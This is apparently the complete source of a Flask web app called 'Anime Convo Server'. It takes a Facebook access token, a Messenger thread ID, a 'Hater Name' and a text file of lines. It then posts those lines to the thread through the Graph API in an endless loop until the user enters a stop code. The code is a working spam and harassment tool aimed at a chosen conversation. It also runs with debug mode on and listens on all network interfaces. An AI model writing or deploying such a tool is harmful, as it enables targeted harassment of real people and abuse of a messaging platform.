from flask import Flask, request, render_template_string
import requests, os, time, uuid, threading

app = Flask(__name__)
app.debug = True

# Stop codes ko store karne ke liye
active_tasks = {}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

def send_messages(task_id, access_token, thread_id, mn, messages, time_interval):
    """Background thread: Messages send karta hai jab tak stop na ho"""
    while task_id in active_tasks:
        try:
            for message1 in messages:
                if task_id not in active_tasks:  # stop ho gaya
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"[{task_id}] Sent: {message}")
                else:
                    print(f"[{task_id}] Failed: {message}")
                time.sleep(time_interval)
        except Exception as e:
            print(f"[{task_id}] Error: {e}")
            time.sleep(5)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Agar stop ID submit hua
        stop_id = request.form.get("stopId")
        if stop_id:
            if stop_id in active_tasks:
                del active_tasks[stop_id]
                return f"<h2 style='color:red;'>✅ Messages stopped for ID: {stop_id}</h2><a href='/'>Go Back</a>"
            else:
                return f"<h2 style='color:orange;'>⚠️ Invalid Stop ID</h2><a href='/'>Go Back</a>"

        # Normal form (start sending)
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = str(uuid.uuid4())[:8]  # Unique stop code
        active_tasks[task_id] = True

        # Thread start
        threading.Thread(target=send_messages, args=(task_id, access_token, thread_id, mn, messages, time_interval), daemon=True).start()

        return f"""
        <div style='text-align:center;margin-top:50px;'>
          <h2 style='color:green;'>✅ Messages Started!</h2>
          <p>Use this <b>STOP ID</b> to stop messages:</p>
          <h3 style='color:red;'>{task_id}</h3>
          <a href='/'>Go Back</a>
        </div>
        """

    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Anime Server 🚀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background: url('https://i.ibb.co/rKJkLpXq/FB-IMG-17565703745232914.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Trebuchet MS', sans-serif;
    }
    .container{
      max-width: 400px;
      background-color: rgba(255,255,255,0.9);
      border-radius: 15px;
      padding: 25px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
      margin-top: 40px;
    }
    .header{
      text-align: center;
      color: darkblue;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
      border-radius: 12px;
      font-weight: bold;
    }
    .footer{
      text-align: center;
      margin-top: 15px;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3">🔥 Anime Convo Server 🔥</h1>
    <h3>Made By: UMAR 🖤</h3>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">🚀 Start Messages</button>
    </form>
  </div>

  <div class="container mt-4">
    <form action="/" method="post">
      <div class="mb-3">
        <label for="stopId">Enter STOP ID:</label>
        <input type="text" class="form-control" id="stopId" name="stopId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">🛑 Stop Messages</button>
    </form>
  </div>

  <footer class="footer">
    <p>© UMAR Trickster's 2024 | Anime Convo Loader</p>
  </footer>
</body>
</html>
    """)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
